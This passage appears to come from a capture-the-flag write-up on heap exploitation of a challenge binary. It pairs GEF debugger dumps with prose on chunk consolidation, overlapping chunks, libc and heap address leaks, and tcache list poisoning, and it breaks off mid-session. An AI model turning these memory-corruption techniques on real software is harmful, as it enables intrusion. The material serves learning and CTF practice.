 →   26 return SYSCALL_CANCEL (read, fd, buf, nbytes);
    27  }
    28  libc_hidden_def (__libc_read)
    29  
    30  libc_hidden_def (__read)
    31  weak_alias (__libc_read, __read)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x7f7305cf4951 in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7305cf4951 → __GI___libc_read(fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000)
[#1] 0x7f7305c7a071 → _IO_new_file_underflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#2] 0x7f7305c7c23f → __GI__IO_default_uflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#3] 0x7f7305c6f52c → __GI__IO_getline_info(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7f7305c6f62c → __GI__IO_getline(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7f7305c6e2ee → _IO_fgets(buf=0x7fff800c04a0 "", n=0x13, fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#6] 0x55a27b962337 → get_uint()
[#7] 0x55a27b96225d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7f7305e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f7305e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x55a27cdef6e0, bk=0x55a27cdef6e0
 →   Chunk(addr=0x55a27cdef6f0, size=0xab0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/40g 0x55a27cdef6b0
0x55a27cdef6b0: 0x0 0x31
0x55a27cdef6c0: 0x3131313131313131  0x3131313131313131
0x55a27cdef6d0: 0x3131313131313131  0x3131313131313131
0x55a27cdef6e0: 0x0 0xab1
0x55a27cdef6f0: 0x7f7305e2cd00  0x7f7305e2cd00
0x55a27cdef700: 0x0 0x0
0x55a27cdef710: 0x0 0x0
0x55a27cdef720: 0x0 0x0
0x55a27cdef730: 0x0 0x0
0x55a27cdef740: 0x0 0x0
0x55a27cdef750: 0x0 0x0
0x55a27cdef760: 0x0 0x0
0x55a27cdef770: 0x0 0x0
0x55a27cdef780: 0x0 0x0
0x55a27cdef790: 0x0 0x0
0x55a27cdef7a0: 0x0 0x0
0x55a27cdef7b0: 0x0 0x0
0x55a27cdef7c0: 0x0 0x0
0x55a27cdef7d0: 0x0 0x0
0x55a27cdef7e0: 0x0 0x0
gef➤  x/40g 0x55a27cdefbf0
0x55a27cdefbf0: 0x510   0x90
0x55a27cdefc00: 0x3030303030303030  0x3030303030303030
0x55a27cdefc10: 0x3030303030303030  0x3030303030303030
0x55a27cdefc20: 0x3030303030303030  0x3030303030303030
0x55a27cdefc30: 0x3030303030303030  0x3030303030303030
0x55a27cdefc40: 0x3030303030303030  0x3030303030303030
0x55a27cdefc50: 0x3030303030303030  0x3030303030303030
0x55a27cdefc60: 0x3030303030303030  0x3030303030303030
0x55a27cdefc70: 0x3030303030303030  0x3030303030303030
0x55a27cdefc80: 0x5a0   0x510
0x55a27cdefc90: 0x0 0x0
0x55a27cdefca0: 0x0 0x0
0x55a27cdefcb0: 0x0 0x0
0x55a27cdefcc0: 0x0 0x0
0x55a27cdefcd0: 0x0 0x0
0x55a27cdefce0: 0x0 0x0
0x55a27cdefcf0: 0x0 0x0
0x55a27cdefd00: 0x0 0x0
0x55a27cdefd10: 0x0 0x0
0x55a27cdefd20: 0x0 0x0
gef➤  c
Continuing.
```

Just like that, we caused consolidation. The heap now believes that there is a chunk at `0x55a27cdef6e0`, of size `0xab0`. Of course, we still have the allocated chunk at `0x55a27cdefbf0`, which has not been freed yet. Let's go ahead, and allocate a chunk off of the consolidated chunk, to line up the remaining chunk (which should be inserted into the unsorted bin) right with `0x55a27cdefbf0`:

```
^C
Program received signal SIGINT, Interrupt.
0x00007f7305cf4951 in __GI___libc_read (fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26  return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$rcx   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1000          
$rsp   : 0x00007fff800c03b8  →  0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax
$rbp   : 0x00007f7305dcb430  →  0x0000000000000000
$rsi   : 0x000055a27cdee6b0  →  0x0000000a30380a31 ("1\n80\n"?)
$rdi   : 0x0             
$rip   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x4000000       
$r11   : 0x246           
$r12   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$r13   : 0x00007f7305dcb2e0  →  0x0000000000000000
$r14   : 0x00007fff800c04a0  →  0x0000000000000000
$r15   : 0x12            
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c03b8│+0x0000: 0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax   ← $rsp
0x00007fff800c03c0│+0x0008: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03c8│+0x0010: 0x00007f7305dcb430  →  0x0000000000000000
0x00007fff800c03d0│+0x0018: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03d8│+0x0020: 0x000055a27cdee6b2  →  0x00000000000a3038 ("80\n"?)
0x00007fff800c03e0│+0x0028: 0x00007fff800c04a0  →  0x0000000000000000
0x00007fff800c03e8│+0x0030: 0x00007f7305c7c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007fff800c03f0│+0x0038: 0x000055a27cdee2a0  →  "Please enter menu choice:\nnk\n2.) View Chunk\n3.)[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7305cf494b <read+11>     je  0x7f7305cf4960 <__GI___libc_read+32>
   0x7f7305cf494d <read+13>     xor eax, eax
   0x7f7305cf494f <read+15>     syscall
 → 0x7f7305cf4951 <read+17>     cmp rax, 0xfffffffffffff000
   0x7f7305cf4957 <read+23>     ja  0x7f7305cf49b0 <__GI___libc_read+112>
   0x7f7305cf4959 <read+25>     ret    
   0x7f7305cf495a <read+26>     nop WORD PTR [rax+rax*1+0x0]
   0x7f7305cf4960 <read+32>     sub rsp, 0x28
   0x7f7305cf4964 <read+36>     mov QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
    21  
    22  /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
    23  ssize_t
    24  __libc_read (int fd, void *buf, size_t nbytes)
    25  {
 →   26 return SYSCALL_CANCEL (read, fd, buf, nbytes);
    27  }
    28  libc_hidden_def (__libc_read)
    29  
    30  libc_hidden_def (__read)
    31  weak_alias (__libc_read, __read)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x7f7305cf4951 in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7305cf4951 → __GI___libc_read(fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000)
[#1] 0x7f7305c7a071 → _IO_new_file_underflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#2] 0x7f7305c7c23f → __GI__IO_default_uflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#3] 0x7f7305c6f52c → __GI__IO_getline_info(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7f7305c6f62c → __GI__IO_getline(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7f7305c6e2ee → _IO_fgets(buf=0x7fff800c04a0 "", n=0x13, fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#6] 0x55a27b962337 → get_uint()
[#7] 0x55a27b96225d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7f7305e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f7305e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x55a27cdefbf0, bk=0x55a27cdefbf0
 →   Chunk(addr=0x55a27cdefc00, size=0x5a0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/40g 0x55a27cdefbf0
0x55a27cdefbf0: 0x510   0x5a1
0x55a27cdefc00: 0x7f7305e2cd00  0x7f7305e2cd00
0x55a27cdefc10: 0x0 0x0
0x55a27cdefc20: 0x3030303030303030  0x3030303030303030
0x55a27cdefc30: 0x3030303030303030  0x3030303030303030
0x55a27cdefc40: 0x3030303030303030  0x3030303030303030
0x55a27cdefc50: 0x3030303030303030  0x3030303030303030
0x55a27cdefc60: 0x3030303030303030  0x3030303030303030
0x55a27cdefc70: 0x3030303030303030  0x3030303030303030
0x55a27cdefc80: 0x5a0   0x510
0x55a27cdefc90: 0x0 0x0
0x55a27cdefca0: 0x0 0x0
0x55a27cdefcb0: 0x0 0x0
0x55a27cdefcc0: 0x0 0x0
0x55a27cdefcd0: 0x0 0x0
0x55a27cdefce0: 0x0 0x0
0x55a27cdefcf0: 0x0 0x0
0x55a27cdefd00: 0x0 0x0
0x55a27cdefd10: 0x0 0x0
0x55a27cdefd20: 0x0 0x0
gef➤  c
Continuing.
```

Like that, we have directly overlapped an unsorted bin chunk, with an allocated chunk. Right now, since it is the only chunk in the unsorted list, both the fwd/bk pointers are to libc addresses (so we can get libc infoleaks). Unfortunately as we can see, the first address begins with a null byte. In order to view it (since we view it with a `%s`), we would have to overwrite the first byte.

Let's free another chunk that will get inserted into the unsorted bin, which should make the `bk` ptr to a heap address:

```
^C
Program received signal SIGINT, Interrupt.
0x00007f7305cf4951 in __GI___libc_read (fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26  return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$rcx   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1000          
$rsp   : 0x00007fff800c03b8  →  0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax
$rbp   : 0x00007f7305dcb430  →  0x0000000000000000
$rsi   : 0x000055a27cdee6b0  →  "\n\n80\n"
$rdi   : 0x0             
$rip   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x00007fff800c0287  →  0x007f7305c4f2b200
$r11   : 0x246           
$r12   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$r13   : 0x00007f7305dcb2e0  →  0x0000000000000000
$r14   : 0x00007fff800c04a0  →  0x0000000000000000
$r15   : 0x12            
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c03b8│+0x0000: 0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax   ← $rsp
0x00007fff800c03c0│+0x0008: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03c8│+0x0010: 0x00007f7305dcb430  →  0x0000000000000000
0x00007fff800c03d0│+0x0018: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03d8│+0x0020: 0x000055a27cdee6b1  →  0x000000000a30380a ("\n80\n"?)
0x00007fff800c03e0│+0x0028: 0x00007fff800c04a0  →  0x0000000000000000
0x00007fff800c03e8│+0x0030: 0x00007f7305c7c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007fff800c03f0│+0x0038: 0x000055a27cdee2a0  →  "Please enter menu choice:\nnk\n2.) View Chunk\n3.)[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7305cf494b <read+11>     je  0x7f7305cf4960 <__GI___libc_read+32>
   0x7f7305cf494d <read+13>     xor eax, eax
   0x7f7305cf494f <read+15>     syscall
 → 0x7f7305cf4951 <read+17>     cmp rax, 0xfffffffffffff000
   0x7f7305cf4957 <read+23>     ja  0x7f7305cf49b0 <__GI___libc_read+112>
   0x7f7305cf4959 <read+25>     ret    
   0x7f7305cf495a <read+26>     nop WORD PTR [rax+rax*1+0x0]
   0x7f7305cf4960 <read+32>     sub rsp, 0x28
   0x7f7305cf4964 <read+36>     mov QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
    21  
    22  /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
    23  ssize_t
    24  __libc_read (int fd, void *buf, size_t nbytes)
    25  {
 →   26 return SYSCALL_CANCEL (read, fd, buf, nbytes);
    27  }
    28  libc_hidden_def (__libc_read)
    29  
    30  libc_hidden_def (__read)
    31  weak_alias (__libc_read, __read)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x7f7305cf4951 in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7305cf4951 → __GI___libc_read(fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000)
[#1] 0x7f7305c7a071 → _IO_new_file_underflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#2] 0x7f7305c7c23f → __GI__IO_default_uflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#3] 0x7f7305c6f52c → __GI__IO_getline_info(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7f7305c6f62c → __GI__IO_getline(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7f7305c6e2ee → _IO_fgets(buf=0x7fff800c04a0 "", n=0x13, fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#6] 0x55a27b962337 → get_uint()
[#7] 0x55a27b96225d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7f7305e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f7305e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x55a27cdf0220, bk=0x55a27cdefbf0
 →   Chunk(addr=0x55a27cdf0230, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x55a27cdefc00, size=0x5a0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/40g 0x55a27cdefbf0
0x55a27cdefbf0: 0x510   0x5a1
0x55a27cdefc00: 0x3030303030303030  0x55a27cdf0220
0x55a27cdefc10: 0x0 0x0
0x55a27cdefc20: 0x3030303030303030  0x3030303030303030
0x55a27cdefc30: 0x3030303030303030  0x3030303030303030
0x55a27cdefc40: 0x3030303030303030  0x3030303030303030
0x55a27cdefc50: 0x3030303030303030  0x3030303030303030
0x55a27cdefc60: 0x3030303030303030  0x3030303030303030
0x55a27cdefc70: 0x3030303030303030  0x3030303030303030
0x55a27cdefc80: 0x5a0   0x510
0x55a27cdefc90: 0x0 0x0
0x55a27cdefca0: 0x0 0x0
0x55a27cdefcb0: 0x0 0x0
0x55a27cdefcc0: 0x0 0x0
0x55a27cdefcd0: 0x0 0x0
0x55a27cdefce0: 0x0 0x0
0x55a27cdefcf0: 0x0 0x0
0x55a27cdefd00: 0x0 0x0
0x55a27cdefd10: 0x0 0x0
0x55a27cdefd20: 0x0 0x0
gef➤  c
Continuing.
```

So we see, the `bk` ptr got overwritten to `0x55a27cdf0220`, which is the chunk we inserted into the unsorted bin. We also see that the `fd` ptr we overwrote with 8 non-null bytes. This means we can leak the heap address, since our read begins at the first byte, and ends with the first null byte (`%s` in action again).

Now with that, we were able to get our libc/heap infoleaks. Let's move on to the tcache linked list primitive. Let's go ahead and allocate those chunks. Also, I will need to overwrite the `fd` ptr at `0x55a27cdefc00` again, to the correct value, since it will actually try to use that ptr:

```
^C
Program received signal SIGINT, Interrupt.
0x00007f7305cf4951 in __GI___libc_read (fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26  return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$rcx   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1000          
$rsp   : 0x00007fff800c03b8  →  0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax
$rbp   : 0x00007f7305dcb430  →  0x0000000000000000
$rsi   : 0x000055a27cdee6b0  →  "9\n8\n\n"
$rdi   : 0x0             
$rip   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$r8 : 0x0            
$r9 : 0x0            
$r10   : 0x000055a27cdf0730  →  0x0000000000000330
$r11   : 0x246           
$r12   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$r13   : 0x00007f7305dcb2e0  →  0x0000000000000000
$r14   : 0x00007fff800c04a0  →  0x0000000000000000
$r15   : 0x12            
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff800c03b8│+0x0000: 0x00007f7305c7a071  →  <__GI__IO_file_underflow+353> test rax, rax   ← $rsp
0x00007fff800c03c0│+0x0008: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03c8│+0x0010: 0x00007f7305dcb430  →  0x0000000000000000
0x00007fff800c03d0│+0x0018: 0x00007f7305e2cac0  →  0x00000000fbad2088
0x00007fff800c03d8│+0x0020: 0x000055a27cdee6b2  →  0x00000000000a0a38 ("8\n\n"?)
0x00007fff800c03e0│+0x0028: 0x00007fff800c04a0  →  0x0000000000000000
0x00007fff800c03e8│+0x0030: 0x00007f7305c7c23f  →  <_IO_default_uflow+47> cmp eax, 0xffffffff
0x00007fff800c03f0│+0x0038: 0x000055a27cdee2a0  →  "Please enter menu choice:\nnk\n2.) View Chunk\n3.)[...]"
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f7305cf494b <read+11>     je  0x7f7305cf4960 <__GI___libc_read+32>
   0x7f7305cf494d <read+13>     xor eax, eax
   0x7f7305cf494f <read+15>     syscall
 → 0x7f7305cf4951 <read+17>     cmp rax, 0xfffffffffffff000
   0x7f7305cf4957 <read+23>     ja  0x7f7305cf49b0 <__GI___libc_read+112>
   0x7f7305cf4959 <read+25>     ret    
   0x7f7305cf495a <read+26>     nop WORD PTR [rax+rax*1+0x0]
   0x7f7305cf4960 <read+32>     sub rsp, 0x28
   0x7f7305cf4964 <read+36>     mov QWORD PTR [rsp+0x18], rdx
─────────────────────────────────────────────────────────────── source:../sysdeps/unix[...].c+26 ────
    21  
    22  /* Read NBYTES into BUF from FD.  Return the number read or -1.  */
    23  ssize_t
    24  __libc_read (int fd, void *buf, size_t nbytes)
    25  {
 →   26 return SYSCALL_CANCEL (read, fd, buf, nbytes);
    27  }
    28  libc_hidden_def (__libc_read)
    29  
    30  libc_hidden_def (__read)
    31  weak_alias (__libc_read, __read)
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-01", stopped 0x7f7305cf4951 in __GI___libc_read (), reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f7305cf4951 → __GI___libc_read(fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000)
[#1] 0x7f7305c7a071 → _IO_new_file_underflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#2] 0x7f7305c7c23f → __GI__IO_default_uflow(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#3] 0x7f7305c6f52c → __GI__IO_getline_info(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1, eof=0x0)
[#4] 0x7f7305c6f62c → __GI__IO_getline(fp=0x7f7305e2cac0 <_IO_2_1_stdin_>, buf=0x7fff800c04a0 "", n=0x12, delim=0xa, extract_delim=0x1)
[#5] 0x7f7305c6e2ee → _IO_fgets(buf=0x7fff800c04a0 "", n=0x13, fp=0x7f7305e2cac0 <_IO_2_1_stdin_>)
[#6] 0x55a27b962337 → get_uint()
[#7] 0x55a27b96225d → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/40g 0x55a27cdefbf0
0x55a27cdefbf0: 0x510   0x5a1
0x55a27cdefc00: 0x7f7305e2d150  0x7f7305e2d150
0x55a27cdefc10: 0x55a27cdefbf0  0x55a27cdefbf0
0x55a27cdefc20: 0x3030303030303030  0x3030303030303030
0x55a27cdefc30: 0x3030303030303030  0x3030303030303030
0x55a27cdefc40: 0x3030303030303030  0x3030303030303030
0x55a27cdefc50: 0x3030303030303030  0x3030303030303030
0x55a27cdefc60: 0x3030303030303030  0x3030303030303030
0x55a27cdefc70: 0x3030303030303030  0x3030303030303030
0x55a27cdefc80: 0x5a0   0x510
0x55a27cdefc90: 0x0 0x0
0x55a27cdefca0: 0x0 0x0
0x55a27cdefcb0: 0x0 0x0
0x55a27cdefcc0: 0x0 0x0
0x55a27cdefcd0: 0x0 0x0
0x55a27cdefce0: 0x0 0x0
0x55a27cdefcf0: 0x0 0x0
0x55a27cdefd00: 0x0 0x0
0x55a27cdefd10: 0x0 0x0
0x55a27cdefd20: 0x0 0x0
gef➤  x/10g 0x55a27b965040
0x55a27b965040 <chunks>:    0x55a27cdef6c0  0x55a27cdef6f0
0x55a27b965050 <chunks+16>: 0x55a27cdefc00  0x0
0x55a27b965060 <chunks+32>: 0x55a27cdf01a0  0x55a27cdf0230
0x55a27b965070 <chunks+48>: 0x55a27cdf0740  0x55a27cdf0260
0x55a27b965080 <chunks+64>: 0x55a27cdf02f0  0x55a27cdf0380
gef➤  x/100g 0x55a27cdf0220
0x55a27cdf0220: 0x0 0x31
0x55a27cdf0230: 0x7f7305e2d130  0x7f7305e2d130
0x55a27cdf0240: 0x55a27cdf0220  0x55a27cdf0220
0x55a27cdf0250: 0x0 0x91
0x55a27cdf0260: 0x7f7305e2cd00  0x7f7305e2cd00
0x55a27cdf0270: 0x0 0x0
0x55a27cdf0280: 0x0 0x0
0x55a27cdf0290: 0x0 0x0
0x55a27cdf02a0: 0x0 0x0
0x55a27cdf02b0: 0x0 0x0
0x55a27cdf02c0: 0x0 0x0
0x55a27cdf02d0: 0x0 0x0
0x55a27cdf02e0: 0x0 0x91
0x55a27cdf02f0: 0x7f7305e2cd00  0x7f7305e2cd00
0x55a27cdf0300: 0x0 0x0
0x55a27cdf0310: 0x0 0x0
0x55a27cdf0320: 0x0 0x0
0x55a27cdf0330: 0x0 0x0
0x55a27cdf0340: 0x0 0x0
0x55a27cdf0350: 0x0 0x0
0x55a27cdf0360: 0x0 0x0
0x55a27cdf0370: 0x0 0x91
0x55a27cdf0380: 0x7f7305e2cd00  0x7f7305e2cd00
0x55a27cdf0390: 0x0 0x0
0x55a27cdf03a0: 0x0 0x0
0x55a27cdf03b0: 0x0 0x0
0x55a27cdf03c0: 0x0 0x0
0x55a27cdf03d0: 0x0 0x0
0x55a27cdf03e0: 0x0 0x0
0x55a27cdf03f0: 0x0 0x0
0x55a27cdf0400: 0x0 0x331
0x55a27cdf0410: 0x7f7305e2cd00  0x7f7305e2cd00
0x55a27cdf0420: 0x0 0x0
0x55a27cdf0430: 0x0 0x0
0x55a27cdf0440: 0x0 0x0
0x55a27cdf0450: 0x0 0x0
0x55a27cdf0460: 0x0 0x0
0x55a27cdf0470: 0x0 0x0
0x55a27cdf0480: 0x0 0x0
0x55a27cdf0490: 0x0 0x0
0x55a27cdf04a0: 0x0 0x0
0x55a27cdf04b0: 0x0 0x0
0x55a27cdf04c0: 0x0 0x0
0x55a27cdf04d0: 0x0 0x0
0x55a27cdf04e0: 0x0 0x0
0x55a27cdf04f0: 0x0 0x0
0x55a27cdf0500: 0x0 0x0
0x55a27cdf0510: 0x0 0x0
0x55a27cdf0520: 0x0 0x0
0x55a27cdf0530: 0x0 0x0
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7f7305e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7f7305e2cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x55a27cdf0400, bk=0x55a27cdf0400
 →   Chunk(addr=0x55a27cdf0410, size=0x330, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7f7305e2cca0 ──────────────────────────────
[+] large_bins[69]: fw=0x55a27cdefbf0, bk=0x55a27cdefbf0
 →   Chunk(addr=0x55a27cdefc00, size=0x5a0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in 1 large non-empty bins.
gef➤  c
Continuing.
```

So we see our three chunks that we will insert into the tcache (`0x55a27cdf0250/0x55a27cdf02e0/0x55a27cdf0370`). Let's insert them into the tcache:

```
^C
Program received signal SIGINT, Interrupt.
0x00007f7305cf4951 in __GI___libc_read (fd=0x0, buf=0x55a27cdee6b0, nbytes=0x1000) at ../sysdeps/unix/sysv/linux/read.c:26
26  return SYSCALL_CANCEL (read, fd, buf, nbytes);

[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xfffffffffffffe00
$rbx   : 0x00007f7305e2cac0  →  0x00000000fbad2088
$rcx   : 0x00007f7305cf4951  →  0x5777fffff0003d48 ("H="?)
$rdx   : 0x1000          
